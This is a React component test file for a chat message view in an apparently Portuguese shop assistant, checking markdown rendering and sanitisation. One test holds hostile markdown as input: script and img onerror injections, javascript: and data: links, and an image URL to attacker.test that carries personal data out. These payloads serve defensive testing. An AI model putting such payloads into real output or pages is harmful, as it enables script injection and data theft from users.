import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { MessageView } from "@/components/chat/message-view";
import type { ChatMessage } from "@/lib/chat/types";
import { assembleMessage } from "@/test/fixtures";

function assistant(text: string): ChatMessage {
  return { id: "m1", role: "assistant", parts: [{ type: "text", text, state: "done" }] };
}

describe("MessageView", () => {
  it("renders the plain-text answer as markdown and hides metadata", async () => {
    const message = await assembleMessage("plain-text");
    message.parts = [
      ...message.parts,
      { type: "text", text: "Temos **violões** em promoção.", state: "done" },
    ];
    const { container } = render(<MessageView message={message} />);

    expect(screen.getByText(/Eu sou a Melody/)).toBeInTheDocument();
    // Streamdown renders bold as a styled span.
    expect(container.querySelector('[data-streamdown="strong"]')).toHaveTextContent("violões");
    expect(container).not.toHaveTextContent("greeting");
    expect(container).not.toHaveTextContent("claude-haiku");
  });

  it("neutralizes hostile markdown", () => {
    const hostile = [
      "<script>alert(1)</script>",
      '<img src=x onerror="alert(1)">',
      '<iframe src="https://x"></iframe>',
      "![](https://attacker.test/?q=pii)",
      "[a](javascript:alert(1))",
      "[b](data:text/html;base64,xx)",
      "[loja](https://emporio.test/politicas)",
    ].join("\n\n");
    const { container } = render(<MessageView message={assistant(hostile)} />);

    expect(container.querySelector("img, iframe, script")).toBeNull();
    expect(container).not.toHaveTextContent(/blocked/i);
    for (const anchor of container.querySelectorAll("a")) {
      expect(anchor.getAttribute("href") ?? "").not.toMatch(/^(javascript|data):/i);
    }
    const safe = screen.getByRole("link", { name: "loja" });
    expect(safe).toHaveAttribute("href", "https://emporio.test/politicas");
    expect(safe).toHaveAttribute("target", "_blank");
    expect(safe.getAttribute("rel")).toContain("noopener");
  });

  it("renders a user message as plain text", () => {
    const user: ChatMessage = {
      id: "u1",
      role: "user",
      parts: [{ type: "text", text: "**Oi**" }],
    };
    const { container } = render(<MessageView message={user} />);
    expect(container.querySelector('strong, [data-streamdown="strong"]')).toBeNull();
    expect(screen.getByText("**Oi**")).toBeInTheDocument();
  });
});
